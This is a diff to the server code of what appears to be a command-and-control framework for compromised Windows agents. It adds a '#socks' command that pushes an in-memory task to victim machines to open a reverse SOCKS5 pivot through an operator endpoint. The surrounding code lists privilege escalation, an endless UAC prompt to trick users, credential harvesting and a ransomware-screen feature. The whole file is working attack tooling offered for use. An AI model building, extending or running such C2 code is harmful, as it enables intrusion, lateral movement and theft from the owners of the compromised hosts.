@@ -2,6 +2,7 @@ from flask import request
 from flask_login import current_user
 from flask_socketio import SocketIO, join_room, leave_room, emit
 from glycon.config import CONFIG
+from glycon.vaporlink import VAPORLINK_MANAGER
 import sqlite3
 from datetime import datetime
 import json
@@ -250,6 +251,7 @@ def init_socket_handlers(socketio):
                         "  #getsystem         - Elevate to NT AUTHORITY\\SYSTEM (Requires Admin)\r\n"
                         "  #spawnas <user>    - Spawn agent as specified user (Requires SYSTEM/Admin)\r\n"
                         "  #uacloop           - Infinite UAC prompt until user accepts to spawn elevated agent\r\n"
+                        "  #socks [start|stop|status] - Control VaporLink reverse SOCKS5 pivot on this agent\r\n"
                     )
                     emit('terminal_output', {
                         'agent_id': agent_id,
@@ -403,6 +405,53 @@ result = "Ransomware screen cleared and Explorer restarted"
                         task_data = {'seconds': 15}  # Default to 15 seconds if no duration provided
                 elif cmd_type == 'creds':
                     task_type = 'harvest_creds'
+                elif cmd_type in ('socks', 'vaporlink', 'pivot'):
+                    sub_cmd = arg.strip().lower() or 'start'
+                    if sub_cmd == 'status':
+                        vl_st = VAPORLINK_MANAGER.get_status()
+                        matching = [s for s in vl_st['sessions'] if s.get('agent_id') == agent_id]
+                        if matching:
+                            s = matching[0]
+                            primary_tag = f" [PRIMARY -> {s['primary_socks_bind']}]" if s['is_primary'] else ""
+                            out_msg = (
+                                f"\r\n[+] VaporLink SOCKS5 Pivot ACTIVE for agent {agent_id}\r\n"
+                                f"    Session ID      : {s['session_id']}\r\n"
+                                f"    Dedicated Proxy : socks5://{s['dedicated_socks_bind']}{primary_tag}\r\n"
+                                f"    Active Streams  : {s['active_streams']} | TX: {s['bytes_tx']} B | RX: {s['bytes_rx']} B\r\n"
+                            )
+                        else:
+                            out_msg = f"\r\n[*] VaporLink SOCKS5 Pivot is currently INACTIVE for agent {agent_id}. Run '#socks start' to launch.\r\n"
+                        emit('terminal_output', {
+                            'agent_id': agent_id,
+                            'output': out_msg,
+                            'current_dir': current_dir
+                        }, room=f"terminal_{agent_id}")
+                        conn.close()
+                        return
+                    elif sub_cmd in ('start', 'stop'):
+                        if sub_cmd == 'stop':
+                            for sid, sess in list(VAPORLINK_MANAGER.sessions.items()):
+                                if sess.agent_id == agent_id:
+                                    VAPORLINK_MANAGER.kick_session(sid)
+                        task_type = 'execute_python'
+                        task_data = {'code': VAPORLINK_MANAGER.build_agent_memory_task(action=sub_cmd, agent_id=agent_id)}
+                        cfg = VAPORLINK_MANAGER.config
+                        emit('terminal_output', {
+                            'agent_id': agent_id,
+                            'output': (
+                                f"\r\n[*] VaporLink Reverse SOCKS5 Pivot {sub_cmd.upper()} queued.\r\n"
+                                f"    WSS Endpoint : {cfg['ws_link']} | Primary SOCKS5 : {cfg['socks_ip']}:{cfg['socks_port']}\r\n"
+                            ),
+                            'current_dir': current_dir
+                        }, room=f"terminal_{agent_id}")
+                    else:
+                        emit('terminal_output', {
+                            'agent_id': agent_id,
+                            'output': "\r\n[!] Usage: #socks [start|stop|status]\r\n",
+                            'current_dir': current_dir
+                        }, room=f"terminal_{agent_id}")
+                        conn.close()
+                        return
                 elif cmd_type == 'getsystem':
                     # Get the most recent server_url from agent configurations
                     c.execute("SELECT server_url FROM agent_configurations ORDER BY timestamp DESC LIMIT 1")
